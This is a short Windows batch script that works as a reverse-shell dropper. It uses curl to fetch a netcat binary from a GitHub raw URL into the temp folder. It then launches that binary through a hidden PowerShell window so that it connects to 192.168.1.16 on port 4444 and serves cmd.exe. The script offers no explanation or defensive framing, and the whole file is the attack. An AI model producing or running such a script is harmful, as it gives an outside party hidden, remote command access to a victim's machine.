@echo off
set "batFilePath=%temp%\pro.bat"

if not exist "%batFilePath%" (
    echo @echo off > "%batFilePath%"
    curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe >> "%batFilePath%"
)
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\nc.exe\" -ArgumentList '-nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden"
